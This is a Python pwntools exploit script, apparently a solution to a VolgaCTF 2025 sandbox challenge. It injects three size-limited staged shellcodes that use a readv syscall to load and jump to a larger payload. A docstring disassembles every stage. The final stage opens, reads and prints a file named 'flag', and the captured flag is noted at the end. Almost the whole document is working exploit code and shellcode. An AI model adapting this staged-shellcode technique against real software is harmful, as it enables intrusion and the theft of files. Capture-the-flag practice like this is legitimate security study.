#!/usr/bin/env python3

from pwn import *

elf = ELF( "app", False )
# libc = ELF( "libc.so.6", False )

# s = remote( "pwn-sbsbx-1.q.2025.volgactf.ru", 33072 )
# s = remote( "localhost", 33072 )
s = process( elf.path )


"""
--- Stage 1: Prepare future rdi (&iovec) --- 

   0:   48 8d 45 f8             lea    rax,[rbp-0x8]
   4:   c3                      ret
   5:   c3                      ret
   6:   c3                      ret
   7:   c3                      ret
   8:   c3                      ret

--- Stage 2: readv(0, &iovec, 1) ---

   0:   b0 13                   mov    al,0x13
   2:   48 87 fe                xchg   rsi,rdi
   5:   b2 01                   mov    dl,0x1
   7:   0f 05                   syscall
   9:   c3                      ret

--- Stage 3: jump to big-shellcode ---

   0:   48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
   4:   ff e0                   jmp    rax
   6:   90                      nop
   7:   90                      nop
   8:   90                      nop

--- Big Stage ---

   0:   68 66 6c 61 67          push   0x67616c66
   5:   54                      push   rsp
   6:   5f                      pop    rdi
   7:   48 c7 c0 02 00 00 00    mov    rax,0x2
   e:   0f 05                   syscall

  10:   48 81 ec 00 01 00 00    sub    rsp,0x100
  17:   48 89 e6                mov    rsi,rsp
  1a:   48 89 c7                mov    rdi,rax
  1d:   48 c7 c2 00 01 00 00    mov    rdx,0x100
  24:   49 c7 c2 00 00 00 00    mov    r10,0x0
  2b:   48 c7 c0 11 00 00 00    mov    rax,0x11
  32:   0f 05                   syscall

  34:   48 c7 c0 01 00 00 00    mov    rax,0x1
  3b:   48 c7 c7 01 00 00 00    mov    rdi,0x1
  42:   48 89 e6                mov    rsi,rsp
  45:   48 c7 c2 00 01 00 00    mov    rdx,0x100
  4c:   0f 05                   syscall

"""


def main():

    shellcodes = [  
        open("stage1-readv",    "rb").read(),
        open("stage2-readv",    "rb").read(),
        open("stage3-readv",    "rb").read(),
        open("big-stage-readv", "rb").read(),
    ]

    assert len(shellcodes[0]) <= 9,  print(f"Shellcode-1: { len(shellcodes[0]) } bytes")
    assert len(shellcodes[1]) <= 10, print(f"Shellcode-2: { len(shellcodes[1]) } bytes")
    assert len(shellcodes[2]) <= 9,  print(f"Shellcode-3: { len(shellcodes[2]) } bytes")

    s.sendafter(b'First:\n',  shellcodes[0])
    s.sendafter(b'Second:\n', shellcodes[1])
    s.sendafter(b'Third:\n',  shellcodes[2])
    
    s.sendline(shellcodes[3])

    s.interactive()


if __name__ == "__main__":
    main()

# VolgaCTF{w4rm1e_upp1e}
